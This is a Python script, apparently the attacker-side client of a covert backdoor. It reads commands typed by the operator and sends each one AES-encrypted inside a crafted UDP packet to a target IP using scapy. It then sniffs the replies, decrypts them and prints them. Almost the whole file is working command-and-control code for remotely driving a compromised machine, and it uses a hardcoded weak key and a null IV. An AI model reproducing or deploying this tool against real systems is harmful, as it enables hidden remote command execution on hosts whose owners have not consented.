import sys, argparse, os, base64, hashlib
from Crypto import Random
from Crypto.Cipher import AES
from scapy.all import *

#Command Line Argument Parser
parser = argparse.ArgumentParser(description='Attacking machine, sends commands to backdoor')
parser.add_argument('-d', '--dstIp', dest='dstIP', help="Destination IP", required=True)

args = parser.parse_args()
dst = args.dstIP



key = 'P@ssw0rd'
IV = 16 * '\x00'#16 is block size




#convert the password to a 32-byte key using the SHA-256 algorithm
def getKey():
	global key
	return hashlib.sha256(key).digest()
	
	
# decrypt using the CFB mode (cipher feedback)
def decrypt(text):
	global IV
	key = getKey()
	decipher = AES.new(key, AES.MODE_CFB, IV)
	plaintext = decipher.decrypt(text)
	return plaintext
	

#encrypt using the CFB mode (cipher feedback)
def encrypt(text):
	key = getKey()
	global IV
	cipher = AES.new(key, AES.MODE_CFB, IV)
	ciphertext = cipher.encrypt(text)
	return ciphertext



#filtering for our packet, print decrypted result
def getResult(packet):

	if ARP in packet:
		return False
	if Raw in packet and UDP in packet:
		print decrypt(packet['Raw'].load)
		return True
		

def main():
	while True:
		#get user input
		cmd = raw_input("Enter a command: ")
	

		if cmd != "exit":
			#send packet with encrypted command
			sendPacket = IP(dst=args.dstIP)/UDP(dport=int(80), sport=8000)/Raw(load=encrypt(cmd))		
			send(sendPacket)


			#filtering for udb packets that match port values
			sniff(filter="udp and (src port 80 and src " + args.dstIP + ")", stop_filter=getResult)
			

		#user exit command
		else:	
			print "Exiting"
			sys.exit()



if __name__== '__main__':
	main()
